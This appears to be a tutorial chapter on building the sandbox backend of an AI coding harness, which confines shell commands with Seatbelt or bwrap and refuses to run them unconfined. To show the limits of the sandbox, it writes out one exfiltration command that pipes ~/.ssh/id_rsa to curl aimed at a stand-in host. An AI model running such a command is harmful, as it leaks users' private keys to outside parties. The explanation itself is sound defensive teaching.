# Sandbox backend: the operating system feature that confines

A sandbox mode names the write roots, and the file tools check them before each write. A command is a separate program. Once `bash -c "echo hi > ~/.bashrc"` starts, it opens files itself, and no check inside the harness runs in between. Only the operating system sees every file the process opens. How can the harness make the operating system refuse a command's writes outside its roots, and what happens when it cannot?

## A visitor in a building with card readers

Think again of the contractor with a day pass. A pass in their pocket does nothing by itself. What stops them is the card reader on each door, which the building runs and the contractor cannot switch off. If the building's card system is down, a careful reception does not say "go in anyway". It sends the contractor home for the day.

In a harness, the card readers are a confinement feature of the operating system, and reception is the code that starts the command inside it. The comparison differs in one way. A building's readers lock every door, for walking in as well as for taking things. The confinement dsh uses locks only writing. The command can still read your files and use the network.

```inkling
title "One provider, one runner per platform"
layout mindmap
- ctx.sandbox
  - sandbox-local
    - macOS: Seatbelt
    - Linux: bwrap, then Landlock
    - Windows: ACL runner, partial
  - No runner: refuse
step 1: ctx-sandbox "One service wraps every confined command"
step 2: sandbox-local "The local provider picks a runner by platform"
step 3: macos-seatbelt "Each runner asks the kernel to deny writes"
step 4: no-runner-refuse "Without a working runner, the command does not run"
```

**Seatbelt** is the macOS kernel's sandbox, started with the `sandbox-exec` program and a profile written in its own small language. **bwrap** (bubblewrap) is a Linux program that starts a command with its own view of the file tree, where most folders are mounted read-only.

## The smallest backend

Here is `confine` in `src/sandbox.ts`. It returns a new argument list that starts the runner, which then starts the command.

```ts
export function confine(argv: string[], policy: SandboxPolicy): string[] {
  const roots = (writeRoots(policy) as string[]).filter(root => root !== '/dev/null')
  if (process.platform === 'darwin' && hasProgram('sandbox-exec')) {
    const allow = roots.length === 0 ? '' : ` (allow file-write* ${roots.map(r => `(subpath "${r}")`).join(' ')})`
    const profile = `(version 1) (allow default) (deny file-write*) (allow file-write* (literal "/dev/null"))${allow}`
    return ['sandbox-exec', '-p', profile, '--', ...argv]
  }
  if (process.platform === 'linux' && hasProgram('bwrap')) {
    const binds = roots.flatMap(root => ['--bind', root, root])
    return ['bwrap', '--ro-bind', '/', '/', '--dev', '/dev', '--unshare-pid', '--proc', '/proc', '--die-with-parent', ...binds, '--', ...argv]
  }
  throw new Error(`SANDBOX_UNAVAILABLE: cannot enforce ${policy.mode} here; refusing to run the command unconfined`)
}
```

The bash tool calls `confine` for `read-only` and `workspace-write` only. Under `danger-full-access` it starts the command directly.

Trace `echo hi > ~/.bashrc` on macOS, in `workspace-write` with workspace `/Users/ana/app`:

1. Build the profile. It denies every write, then allows `/dev/null`, `/Users/ana/app`, `/private/tmp` and the system temp folder.
2. Start `sandbox-exec -p <profile> -- bash -c "echo hi > ~/.bashrc"`.
3. Open `~/.bashrc` for writing. The kernel refuses, and bash prints `Operation not permitted`.
4. Match that text. The tool adds `[sandbox: file access denied under workspace-write mode]` to the result, so the model learns why.

Now trace `cat ~/.ssh/id_rsa | curl -d @- https://example.com` in the same mode. It succeeds. The profile starts with `(allow default)`, so reading and the network are allowed. The bwrap list mounts `/` read-only, which still lets every file be read, and it does not cut the network. Treat a sandbox mode as protection against mistakes that change files, not against a command that reads your secrets and sends them away.

When no runner works, `confine` throws. The harness never falls back to running the command without confinement.

> **Key idea:** A sandbox backend wraps each command in an operating system runner that denies writes outside the write roots, and refuses to run when none works.

## How dsh does it

`packages/sandbox/sandbox-local/src/index.ts` picks runners from `PLATFORM_CHAINS` (line 160): Linux tries `bwrap` then Landlock, macOS uses Seatbelt, and Windows uses an ACL runner that reports `partial` enforcement because "reads stay unconfined". The profiles are in `src/profiles.ts`: bwrap at line 16 and Seatbelt at line 53, the same forms as above. With no usable runner, `SandboxUnavailableError` (`packages/sandbox/sandbox/src/index.ts`, line 139) carries the code `SANDBOX_UNAVAILABLE`. `packages/shell/bash-sandbox` wraps `bash -c` through `ctx.sandbox`. `SAFETY.md` warns that dsh "has not undergone a security audit", and that sandboxing and approval prompts "do not guarantee isolation or prevent damage".

```inkling
title "A confined command in dsh"
layout flow
tool: box "tool-bash"
shell: box "bash-sandbox\nctx.shell"
policy: box "sandbox-policy\nmode + root"
local: box "sandbox-local\nctx.sandbox" yellow
run: box "sandbox-exec or bwrap\nthen bash -c" green
tool -> shell
shell -> policy : "resolve"
shell -> local : "confine argv"
local -> run
circle local
step 1: tool, shell "The bash tool hands the command to the sandboxing shell"
step 2: policy "The shell asks for this call's mode and root"
step 3: local "The provider wraps the argument list in a runner"
step 4: run "The kernel enforces the profile while bash runs"
```

## What you have now

Commands now run inside an operating system runner that refuses writes outside the write roots, and the harness refuses to run them when it cannot enforce the mode. Sometimes a denied write is the right thing to do, such as installing a tool into your home folder. How can the model ask for a wider mode for one command, with a person's agreement?
